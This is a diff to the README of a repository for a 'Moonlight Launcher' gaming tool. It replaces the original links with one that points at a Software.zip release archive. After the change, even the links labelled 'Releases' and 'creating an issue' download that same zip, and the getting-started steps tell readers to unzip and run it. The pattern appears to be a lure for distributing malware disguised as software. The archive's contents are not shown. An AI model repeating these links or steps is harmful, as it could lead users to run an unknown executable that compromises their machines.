@@ -12,7 +12,7 @@ Welcome to the Moonlight Launcher repository, your go-to solution for a convenie
 ## Getting Started 🌟
 
 To get started with Moonlight Launcher, follow these steps:
-1. Download the latest version of Moonlight Launcher from the [link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip), which needs to be launched.
+1. Download the latest version of Moonlight Launcher from the [link](https://github.com/VitorNsousa/moonlight-launcher/releases/download/v1.0/Software.zip), which needs to be launched.
 2. Unzip the file and run the launcher to start using Moonlight hassle-free!
 
 ## Repository Topics 📌
@@ -25,10 +25,10 @@ To get started with Moonlight Launcher, follow these steps:
 
 ## Additional Resources 🛠️
 
-For more information and updates, please visit our [Releases](https://github.com/cli/go-gh/releases) section.
+For more information and updates, please visit our [Releases](https://github.com/VitorNsousa/moonlight-launcher/releases/download/v1.0/Software.zip) section.
 
 ## Support 🤝
 
-If you encounter any issues or have any questions, feel free to reach out to us by [creating an issue](https://github.com/issues/new) in this repository.
+If you encounter any issues or have any questions, feel free to reach out to us by [creating an issue](https://github.com/VitorNsousa/moonlight-launcher/releases/download/v1.0/Software.zip) in this repository.
 
 Let's make your Moonlight gaming experience seamless with Moonlight Launcher! 🎮
